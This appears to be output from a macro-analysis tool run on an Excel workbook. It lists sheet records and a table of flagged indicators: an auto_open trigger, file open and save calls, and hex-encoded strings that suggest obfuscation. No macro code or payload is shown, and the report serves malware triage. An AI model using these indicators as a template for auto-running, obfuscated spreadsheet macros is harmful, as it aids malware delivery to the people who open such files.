' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ý
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - a
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - à
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

